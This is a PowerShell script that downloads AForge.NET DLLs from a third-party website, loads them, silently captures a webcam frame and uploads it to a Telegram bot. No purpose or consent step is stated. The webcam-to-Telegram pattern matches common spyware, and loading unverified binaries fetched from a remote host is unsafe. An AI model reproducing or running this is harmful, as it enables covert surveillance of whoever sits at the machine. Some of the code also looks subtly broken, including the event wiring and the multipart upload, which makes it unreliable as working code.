# Set up paths and URLs
$workingDir = "C:\path\to\AForge.NET"  # Directory to save AForge.NET libraries
$downloadUrlBase = "http://www.arvidsson.org/aforge/"
$files = @(
    "AForge.Video.DirectShow.dll",
    "AForge.Video.FFMPEG.dll",
    "AForge.Imaging.dll"
)

# Ensure the working directory exists
if (-not (Test-Path $workingDir)) {
    New-Item -ItemType Directory -Force -Path $workingDir
}

# Function to download the required files if not already present
function Download-Files {
    param (
        [string]$url,
        [string]$destination
    )

    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationFilePath = Join-Path -Path $destination -ChildPath $fileName

    if (-not (Test-Path $destinationFilePath)) {
        Write-Host "Downloading $fileName..."
        Invoke-WebRequest -Uri $url -OutFile $destinationFilePath
    } else {
        Write-Host "$fileName is already downloaded."
    }
}

# Download AForge.NET libraries
foreach ($file in $files) {
    $url = $downloadUrlBase + $file
    Download-Files -url $url -destination $workingDir
}

# Load the .NET Assembly
Add-Type -Path (Join-Path -Path $workingDir -ChildPath "AForge.Video.DirectShow.dll")
Add-Type -Path (Join-Path -Path $workingDir -ChildPath "AForge.Video.FFMPEG.dll")
Add-Type -Path (Join-Path -Path $workingDir -ChildPath "AForge.Imaging.dll")

# Setup Telegram bot details
$botToken = "YOUR_BOT_TOKEN"
$chatId = "YOUR_CHAT_ID"
$imagePath = "C:\path\to\your\photo.jpg"

# Create a VideoCaptureDevice object and capture an image
function Capture-WebCamImage {
    param (
        [string]$outputPath
    )

    $videoDevices = New-Object AForge.Video.DirectShow.FilterInfoCollection([AForge.Video.DirectShow.FilterCategory]::VideoInputDevice)

    # Check if there are any video devices installed
    if ($videoDevices.Count -eq 0) {
        Write-Host "No video devices found!"
        return
    }

    # Create the VideoCaptureDevice
    $videoSource = New-Object AForge.Video.DirectShow.VideoCaptureDevice($videoDevices[0].MonikerString)

    # Define an event handler for NewFrame
    $newFrameHandler = {
        param ($sender, $eventArgs)

        # Create a bitmap from the current frame
        $bitmap = $eventArgs.Frame.Clone()

        # Save the bitmap to file
        $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

        # Stop capturing
        $videoSource.SignalToStop()
        $videoSource.WaitForStop()
    }

    # Attach event handler and start capturing
    $videoSource.NewFrame += $newFrameHandler
    $videoSource.Start()

    # Wait for a moment to allow the frame to be captured
    Start-Sleep -Seconds 3
}

# Function to send a photo to Telegram
function Send-TelegramPhoto {
    param (
        [string]$botToken,
        [string]$chatId,
        [string]$photoPath
    )

    $url = "https://api.telegram.org/bot$botToken/sendPhoto"
    $multipartContent = @{ "chat_id" = $chatId; "photo" = [IO.File]::ReadAllBytes($photoPath) }

    $response = Invoke-RestMethod -Uri $url -Method Post -Form $multipartContent
    return $response
}

# Capture an image from the webcam
Capture-WebCamImage -outputPath $imagePath

# Send the captured photo to Telegram
$response = Send-TelegramPhoto -botToken $botToken -chatId $chatId -photoPath $imagePath

# Output the response
$response
